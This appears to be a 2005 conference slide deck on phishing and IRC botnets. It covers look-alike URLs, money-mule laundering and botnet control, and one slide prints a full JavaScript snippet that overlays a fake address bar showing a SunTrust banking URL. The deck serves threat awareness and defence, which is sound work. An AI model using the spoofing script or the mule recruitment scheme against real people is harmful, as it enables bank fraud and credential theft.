2005 July 16
Copyright PI:EMAIL
1
Internet Threats in Depth 
Phishing and Botnet
Alan
HIT 2005
2005 July 16
Copyright PI:EMAIL
2
Outline
 Phishing (20 min)
 Botnet (40 min)
2005 July 16
Copyright PI:EMAIL
3
What is Phishing?
 Phishing attacks use both social 
engineering and technical subterfuge to 
steal consumers' personal identity data and 
financial account credentials. 
 Such as credit card numbers, account usernames, 
passwords and social security numbers..
使用者
Username:
Password:
XX银行首页
XX银行通知
假Email
假网站
请点选此連结
网路钓客
2005 July 16
Copyright PI:EMAIL
4
Phishing site sample #1
Steal money or credit card info..
2005 July 16
Copyright PI:EMAIL
5
Phishing site sample #2
Steal onlinebank account 
2005 July 16
Copyright PI:EMAIL
6
Phishing site sample #3
Steal service/identity
2005 July 16
Copyright PI:EMAIL
7
Phishing site sample #4
Steal service/identity
2005 July 16
Copyright PI:EMAIL
8
Phishing site sample #5
Steal service/identity
2005 July 16
Copyright PI:EMAIL
9
Phishing site sample #6
2005 July 16
Copyright PI:EMAIL
10
Incresing of phishing sites
2005 July 16
Copyright PI:EMAIL
11
Tricks of Phishing
 Similar looking URL to Genuine URL  
 Using IP address  
 Pop Up Windows 
 URL spoofing of address bar 
 Install Trojans or Spyware
2005 July 16
Copyright PI:EMAIL
12
Similar looking URL to 
Genuine URL
http://www.barclays.co.uk/ is the 
oringinal bank website.
Two similar looking URL example 
1.
http://www.barclayze.co.uk’
2.
http://www.barclays.validation.co.uk
using a sub-domain such as 
"http://www.barclays.validation.co.uk", where the 
actual domain is "validation.co.uk" which is not 
related to Barclays Bank. 
2005 July 16
Copyright PI:EMAIL
13
Pop Up Windows
open a real webpage in the background while a bare pop up window (without address bar, 
tool bars, status bar and scrollbars) is opened in the foreground to display 
the fake webpage 
2005 July 16
Copyright PI:EMAIL
14
Scripts hide the IE address bar
var vuln_x, vuln_y, vuln_w, vuln_h;
function vuln_calc() {
var root= document[
(document.compatMode=='CSS1Compat') ?
'documentElement' : 'body'
];
vuln_x= window.screenLeft+70;
vuln_y= window.screenTop-45;//adjust window position
vuln_w= root.offsetWidth-200;
vuln_h= 17;//url window height
vuln_show();
}
var vuln_win;
function vuln_pop() {
vuln_win= window.createPopup();
vuln_win.document.body.innerHTML= vuln_html;
vuln_win.document.body.style.margin= 0;
vuln_win.document.body.onunload= vuln_pop;
vuln_show();
}
function vuln_show() {
if (vuln_win)
vuln_win.show(vuln_x, vuln_y, vuln_w, vuln_h);
}
var vuln_html= 'https://internetbanking.suntrust.com/default.asp'
if (window.createPopup) {
vuln_calc();
vuln_pop();
window.setInterval(vuln_calc, 25);
} else {
}
2005 July 16
Copyright PI:EMAIL
15
Install Trojans or Spyware
- Client side attack
 Malicious site (ex.IE iFrame vulnerability MS04-
040,MS05-036/37…)
 Client will d/l malicious file and execute it after 
browsing a malicious page.
2005 July 16
Copyright PI:EMAIL
16
Install Trojans or Spyware
- A malicious site example
2005 July 16
Copyright PI:EMAIL
17
Tricks to keep phishing page stealth
 Using ‘dot’ to hide directory
Unless you use  -a, --all
do not hide entries starting with .
2005 July 16
Copyright PI:EMAIL
18
Data is then sent to  phisher
Send.php
2005 July 16
Copyright PI:EMAIL
19
How to launder money
1.The phisher has already got 
the account info by phishing.
4.The money is then withdrawn by the 
job applicant and wired to foreign 
account (it’s probably another middle 
man).
3.Phisher then transfer money from the 
‘phishing victims’ into the job 
applicants’account.
2.Send mails to recruit job seekers.
5.Finally , phisher get the money.
Local
Foreign
2005 July 16
Copyright PI:EMAIL
20
How to launder money (cont)
- Recruit job seeker by spam
2005 July 16
Copyright PI:EMAIL
21
Beyond phishing
 Phisher uses two methods to speed up the 
installation of phishing sites.
1. Usingf Phishing package.
2. installing redirection services to deliver web traffic 
to existing phishing websites
 Uses the victim host to send spammails for 
advertising phishing websites 
 propagation of spam and phishing
messages via botnets
2005 July 16
Copyright PI:EMAIL
22
Redir
Benefit of redir:
1. Easy to config compromised host
Increase the speed of compromising
vulnerabile systems
2. If a compromised host is detected,
the main phishing site is still alive
if a main site is detected, hacker will
set one of the compromised host to
be the main site
2005 July 16
Copyright PI:EMAIL
23
Active phishing attack!
Cross-site scripting redirection
Script injection
Two threats of web application!
SQL injection
Malicious script
Insert redirect script on forums or guestbook.
1.
2.
Script code can redirect the user to fake authentication 
page and steal his account information.
2005 July 16
Copyright PI:EMAIL
24
Auction scams – interception
1.Send the fake mail to buyer 
before real seller.
2.Send the fake mail to seller.
A scam which focus on dedicated victim!
Typically using Mails overflow to 
reveal the fake mail
2005 July 16
Copyright PI:EMAIL
25
Botnet in depth
2005 July 16
Copyright PI:EMAIL
26
What is BotNet ?
-- Control
IRC constructs a 
signal channel which 
let hackers control 
victims without being 
found.
2005 July 16
Copyright PI:EMAIL
27
Botnet formation
Hacker writes the bot
backdoor
He install the bot
backdoor in the 
compromised hosts
Bot
controller
(IRC server)
Bot
Bot
host with High bandwidth usually chosen to be the 
controller
Nowadays, Botnet is a new control 
machanism after hacking compromised 
hosts.
Insides bot source code
2005 July 16
Copyright PI:EMAIL
28
Botnet formation (cont)
Give orders in IRC channel.
Do spreading automatically
Bot
controller
(IRC server)
2005 July 16
Copyright PI:EMAIL
29
Threats of botnets
 DDoS extortion
 Installing malwares , spywares